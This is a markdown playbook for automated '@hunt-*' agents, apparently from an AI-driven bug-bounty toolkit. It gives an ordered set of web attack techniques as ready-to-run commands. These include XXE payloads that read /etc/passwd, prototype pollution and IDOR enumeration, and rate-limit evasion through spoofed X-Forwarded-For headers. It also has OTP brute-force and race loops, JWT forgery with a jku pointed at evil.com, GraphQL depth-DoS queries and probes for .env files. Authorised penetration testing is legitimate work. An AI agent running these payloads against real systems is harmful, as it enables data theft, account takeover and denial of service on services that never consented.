# Deep Testing — Request Mutation & Parameter Fuzzing

A shared reference for all `@hunt-*` agents. Before testing any specific vulnerability class, run these techniques on every candidate endpoint. They uncover the entry point primitives that make class-specific exploitation possible.

See also: [`browser-flow.md`](browser-flow.md) for client-side testing, [`burp-flow.md`](burp-flow.md) for Burp-specific workflows.

---

## 1. Parameter Fuzzing — Find Hidden Inputs

Hidden parameters can override behavior, toggle debug modes, or bypass access controls. Run BEFORE class-specific tests.

### arjun — URL-based parameter discovery (not auto-installed)
```bash
arjun -u https://target.com/api/endpoint -oJ results.json -t 20
arjun -u https://target.com/api/endpoint -oJ results.json -t 20 --headers "Authorization: Bearer <token>"
```

### ffuf — parameter fuzzing with wordlists
```bash
ffuf -u https://target.com/api/endpoint?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 50 -fc 404
ffuf -u https://target.com/api/endpoint -X POST -d 'FUZZ=test' -H "Content-Type: application/json" -w params.txt -t 50 -fc 404
```

### GF patterns — grep for specific parameter names
```bash
cat $DRISTI_ROOT/engagements/recon/<domain>/params/paramurls.txt | gf redirect | grep -oE '\w+=' | sort -u
cat $DRISTI_ROOT/engagements/recon/<domain>/params/paramurls.txt | gf idor | grep -oE '(id|uid|user|account)=\w+' | sort -u
```

### High-value parameter names to probe:
```
admin, role, is_admin, is_public, user_id, organization_id, debug, test,
bypass, override, dev, env, source, token, api_key, secret, internal,
mock, staging, preview, bypass, disable, enable, feature, flag
```

---

## 2. HTTP Method Mutation — Test Every Verb

Never assume the documented HTTP method is the only one that works. Frameworks often accept multiple methods silently.

### Test every method on every endpoint:
```bash
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE CONNECT; do
  echo "=== $method ==="
  curl -s -X "$method" "https://target.com/api/endpoint" \
    -H "Content-Type: application/json" \
    -d '{"test":"value"}' | head -5
done
```

### Method override headers — bypass method restrictions:
```bash
# Framework-specific override headers
curl -X POST https://target.com/api/resource \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "X-HTTP-Method: PATCH" \
  -H "X-Method-Override: PUT" \
  -H "X-HTTP-Method-Override: PATCH"
```

### What to look for:
- **GET on a POST endpoint** — returns data without auth? (BOLA / IDOR)
- **POST on a GET endpoint** — creates resources unexpectedly?
- **DELETE/PATCH** on user-owned resources — access control bypass?
- **OPTIONS** — reveals allowed methods, auth requirements
- **TRACE** — XST (Cross-Site Tracing) / cookie theft via `Via` header

### 405 method not allowed? Try override headers first, then try:
```bash
curl -X POST https://target.com/api/resource \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "_method=DELETE"
# Or as query param
curl -X GET "https://target.com/api/resource?_method=PUT"
```

---

## 3. Content-Type Switching — Parser Confusion

Many APIs validate input differently based on Content-Type. The JSON parser may block injection while the XML parser is wide open.

### Switch JSON → XML (XXE opportunity):
```bash
curl -s https://target.com/api/endpoint \
  -H "Content-Type: application/xml" \
  -d '<root><param>value</param></root>'
```
Add XXE probe:
```bash
curl -s https://target.com/api/endpoint \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><param>&xxe;</param></root>'
```

### Switch JSON → form-encoded (validation bypass):
```bash
curl -s https://target.com/api/endpoint \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'param=value&admin=true&role=admin'
```

### Switch JSON → multipart (content-type check bypass):
```bash
curl -s https://target.com/api/endpoint \
  -F 'param=value'
```

### Switch XML → JSON (parser desync):
Some endpoints validate one format and parse another. Send valid-looking JSON with XML payload:
```bash
curl -s https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"param": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"}'
```

### Content-Type variations to try:
```
application/json, application/xml, text/xml, application/x-www-form-urlencoded,
multipart/form-data, text/plain, text/html, application/x-yaml,
application/octet-stream, application/graphql, application/jwt
```

---

## 4. IDOR Probes — Access Control Testing

Beyond simple ID enumeration, test these variations on every `/api/<type>/<id>` pattern:

### Numeric ID enumeration:
```bash
for id in 1 2 3 100 1000 9999 -1 0; do
  curl -s "https://target.com/api/users/$id" \
    -H "Authorization: Bearer <token>"
done
```

### UUID enumeration and manipulation:
```bash
# Test known patterns
curl -s "https://target.com/api/users/00000000-0000-0000-0000-000000000000"
curl -s "https://target.com/api/users/ffffffff-ffff-ffff-ffff-ffffffffffff"
curl -s "https://target.com/api/users/../"

# Type confusion — endpoint expects string, send int/array/object
curl -s "https://target.com/api/users/1"
curl -s "https://target.com/api/users/null"
curl -s "https://target.com/api/users/%00"
curl -s "https://target.com/api/users/['1','2']"
```

### ID swap across accounts:
```bash
# Account A fetches Account B's data by swapping ID
curl -s "https://target.com/api/orders/12345" \
  -H "Cookie: session=A_SESSION"
# Now try Account B's order ID with Account A's session
curl -s "https://target.com/api/orders/67890" \
  -H "Cookie: session=A_SESSION"
```

### Parameter pollution:
```bash
# Multiple IDs
curl -s "https://target.com/api/users?id=1&id=2&id=3"
# Array notation  
curl -s "https://target.com/api/users?id[]=1&id[]=2"
# JSON body with array
curl -s -X POST https://target.com/api/batch \
  -H "Content-Type: application/json" \
  -d '{"ids": [1, 2, 3]}'
```

---

## 5. JSON Parameter Pollution — Server-Side Prototype Pollution

If the API accepts JSON, test for prototype pollution and property injection:

### __proto__ injection:
```bash
curl -s -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"admin": true}}'

curl -s -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"admin": true}}}'
```

### Duplicate keys — last one wins:
```bash
curl -s -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"user_id": 1, "user_id": 2, "role": "user", "role": "admin"}'
```

### Array injection:
```bash
curl -s -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"user_id": [1]}'

curl -s -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"permissions": ["read", "write", "admin"]}'
```

### Nested object injection:
```bash
curl -s -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"name": "test", "profile": {"role": "admin", "is_admin": true}}'

curl -s -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"name": "test", "$push": {"roles": "admin"}}'
```

---

## 6. Rate Limit Testing — Bypass Techniques

Always test rate limits on auth endpoints. They're often bypassable.

### X-Forwarded-For rotation:
```bash
for i in $(seq 1 100); do
  ip="192.168.$((RANDOM%256)).$((RANDOM%256))"
  curl -s -X POST https://target.com/api/login \
    -H "X-Forwarded-For: $ip" \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@test.com","pass":"wrong"}'
done
```

### Other IP spoofing headers:
```
X-Forwarded-For, X-Real-IP, X-Originating-IP, X-Remote-IP,
X-Client-IP, X-Remote-Addr, CF-Connecting-IP, True-Client-IP
```

### HTTP/2 multiplexing (single-packet race):
```bash
# Use curl with HTTP/2 multiplexing to send requests in parallel
curl --http2 -s \
  -X POST https://target.com/api/reset-password \
  -H "Content-Type: application/json" \
  --next -X POST ...  # Multiple requests in one connection
```

---

## 7. Race Condition Testing — Auth Endpoints

Auth flows (login, signup, password reset, OTP) are the most race-prone. Test BEFORE class-based hunting.

### Parallel signup — same email, 20x:
```bash
for i in $(seq 1 20); do
  curl -s -X POST https://target.com/api/signup \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","pass":"Test123!"}' &
done
wait
```
Check: Did more than one account get created? Can you login with different passwords?

### Parallel password reset:
```bash
# Request 20 reset tokens simultaneously 
for i in $(seq 1 20); do
  curl -s -X POST https://target.com/api/reset-password \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@test.com"}' &
done
wait
# Multiple tokens → reuse any of them
```

### OTP brute-force race:
```bash
# Race to validate OTP before server invalidates it
for code in $(seq 100000 100020); do
  curl -s -X POST https://target.com/api/verify-otp \
    -H "Content-Type: application/json" \
    -d "{\"phone\":\"+1234567890\",\"code\":\"$code\"}" &
done
wait
```

---

## 8. JWT Manipulation

If JWT tokens are found in cookies or Authorization headers:

### Decode and inspect:
```bash
jwt_tool <token>
jwt_tool <token> -T  # Time-based analysis
```

### Algorithm confusion:
```bash
# alg: none
jwt_tool <token> -X a
# alg: HS256 with empty key
jwt_tool <token> -X b -p ""
# alg: HS256 with public key as HMAC secret (RS→HS confusion)
jwt_tool <token> -X b -p /path/to/public.pem
```

### Header injection:
```bash
# kid → path traversal
jwt_tool <token> -X k -I -kc /dev/null
# jwk → embedded key
jwt_tool <token> -X i
# jku → URL injection
jwt_tool <token> -X j -ju "https://evil.com/jwks.json"
```

### Claim manipulation:
```bash
# Modify exp/nbf/iat claims
jwt_tool <token> -X e -I -rc "iat=0"
# Upgrade role in claims
jwt_tool <token> -X p -I -pc "role=admin"
```

---

## 9. GraphQL-Specific Deep Testing

If `/graphql` or `/graphiql` was found:

### Introspection (bypass protections): 
```bash
curl -s https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__schema{types{name fields{name}}}}"}'

# Bypass via GET with query param
curl -s "https://target.com/graphql?query=query{__schema{types{name}}}"

# Bypass via content-type switch
curl -s https://target.com/graphql \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "query=query{__schema{types{name}}}"
```

### Batching attack:
```bash
curl -s https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"mutation{login(pass:\"a\"){token}}"},{"query":"mutation{login(pass:\"b\"){token}}"}]'
```

### Alias-based resource enumeration:
```bash
curl -s https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{a:user(id:1){email}b:user(id:2){email}c:user(id:3){email}}"}'
```

### Depth-based DoS:
```bash
curl -s https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{user{posts{comments{user{posts{comments{user{posts{comments{email}}}}}}}}}}"}'
```

---

## 10. Directory/Path Fuzzing (Extended)

Beyond standard dirbusting, try:

### Case sensitivity:
```bash
curl -s https://target.com/Admin
curl -s https://target.com/ADMIN
curl -s https://target.com/admin/
```

### Path normalization bypass:
```bash
curl -s https://target.com/./admin
curl -s https://target.com//admin
curl -s https://target.com/;/admin
curl -s https://target.com/..;/admin
curl -s https://target.com/%2e%2e/admin
curl -s https://target.com/ADMIN/..;/admin
```

### API version probing:
```bash
curl -s https://target.com/api/v1/users
curl -s https://target.com/api/v2/users
curl -s https://target.com/api/v3/users
curl -s https://target.com/api/internal/users
curl -s https://target.com/api/staging/users
```

### Framework-specific paths:
```bash
# GraphQL
curl -s https://target.com/graphql/console
curl -s https://target.com/graphiql
curl -s https://target.com/voyager

# Swagger/OpenAPI
curl -s https://target.com/swagger-ui.html
curl -s https://target.com/api/docs
curl -s https://target.com/openapi.json

# Admin
curl -s https://target.com/.env
curl -s https://target.com/admin/backup
curl -s https://target.com/logs
```

---

## 11. UUID Analysis — Sequential vs Random

Check how UUIDs are generated. Sequential UUIDs = enumeration possible.

### v1 (time-based) — extract timestamp:
```bash
# Use online tools or uuid-analyze to extract timestamp from UUID
# If UUIDs are v1, you can:
# 1. Extract the timestamp
# 2. Predict future UUIDs
# 3. Enumerate existing resources
```

### v4 (random) — check for sequential patterns:
```bash
# If UUIDs appear random, check if they're actually sequential
# Fetch multiple resources and compare UUIDs
curl -s "https://target.com/api/resource/1" | jq -r '.id'
curl -s "https://target.com/api/resource/2" | jq -r '.id' 
# If IDs are sequential integers disguised as UUIDs, you have an enumeration target
```

### v5 (hash-based) — reverse or predict:
```bash
# If UUID is based on a hash of known inputs (username + namespace)
# Try to reproduce the UUID generation logic
```

---

## 12. Mobile API Surface Testing

If mobile apps are in scope, APIs often behave differently:

### User-Agent switching:
```bash
curl -s https://target.com/api/endpoint \
  -H "User-Agent: Mobile/1.0 (Android 14)"
curl -s https://target.com/api/endpoint \
  -H "User-Agent: com.target.app/2.1 (iOS 18; iPhone16,2)"
```

### Version downgrade:
```bash
curl -s https://target.com/api/v1/endpoint \
  -H "Accept: application/vnd.target.v1+json"
curl -s https://target.com/api/v2/endpoint \
  -H "Accept: application/vnd.target.v2+json"
```

### Mobile-specific endpoints:
```bash
curl -s https://target.com/mobile/
curl -s https://target.com/api/mobile/
curl -s https://target.com/api/app/
curl -s https://target.com/app/
```

---

## Execution Order

Every `@hunt-*` agent should run these techniques in this order before class-specific testing:

```
Step 1: Parameter fuzzing (arjun/x8 — not auto-installed)
Step 2: HTTP method mutation (all verbs + override headers)
Step 3: Content-Type switching (JSON/XML/form/multipart)
Step 4: IDOR probes (numeric/UUID enumeration + swap IDs)
Step 5: JSON parameter pollution (__proto__, duplicate keys)
Step 6: Race condition testing on auth endpoints
Step 7: JWT manipulation (if token found)
Step 8: GraphQL deep testing (if graphql detected)
Step 9: Rate limit bypass (if auth endpoint hit rate limit)
Step 10: Directory path fuzzing (case, normalization, API versions)
```

Not all steps apply to every endpoint. Skip steps that don't match the endpoint's data format (e.g., skip JSON pollution on XML-only endpoints). But **do not skip steps because they seem unlikely** — the whole point is finding the unexpected.
